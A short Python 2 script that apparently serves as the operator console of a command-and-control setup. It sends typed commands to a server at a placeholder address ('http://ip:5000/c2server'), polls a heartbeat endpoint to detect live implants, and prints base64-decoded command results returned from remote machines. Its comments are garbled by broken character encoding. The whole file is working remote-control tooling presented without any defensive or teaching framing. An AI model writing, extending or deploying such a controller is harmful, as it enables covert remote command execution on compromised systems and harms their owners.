#! /usr/bin/env python
# coding=utf-8
import requests
import time
import os
import re
import threading
import base64


def send(c2cmd):
	url="http://ip:5000/c2server?cmd="+c2cmd
	#print url
	# ��������
	i=1
	try:
		while i<10:
			i=i+1
			s1= requests.get(url, timeout=10)
			#print s1.status_code
			if s1.status_code == 200:
				#����ƥ������
				com= s1.content
				#print command
				if com == 'ok':
					return
			time.sleep(1)
	except:
		return None

def heartbeats():
	i=0
	j=0
	url0="http://ip:5000/c2heartbeat?control=test"
	try:
		while True:
			j+=1
			s0= requests.get(url0, timeout=5)
			if s0.status_code == 200:
				c1=s0.content
				break
			if j>40:
				print '\nʧȥ����'
				j=0
			time.sleep(1)
	except:
		pass
	print '������'
	t1 = threading.Thread(target=main)
	t1.start()
	while True:
		i+=1
		if i>5:
			print 'ʧȥ����'
		# ÿ10�����һ��������
		try:
			s0= requests.get(url0, timeout=5)
			if s0.status_code == 200:
				c2=s0.content
			if c2!=c1:
				print '������\nCommand:'
				c1=c2
				c2=''
				i=0
		except:
			pass
		time.sleep(10)


def receive():
	url="http://ip:5000/c2server?results=test"
	# ����ִ�н����Ļ��Է���
	i=1
	try:
		while i<10:
			i=i+1
			s1= requests.get(url,timeout=30)
			if s1.status_code == 200:
				#����ƥ������
				results= s1.content
				print base64.b64decode(results)
				return
			time.sleep(1)
	except:
		return None




def main():
	c2_command = ''
	while True:
		c2_command = raw_input("Command:")
		send(c2_command)
		receive()




if __name__ == '__main__':
	#���������߳�
	t = threading.Thread(target=heartbeats)
	t.start()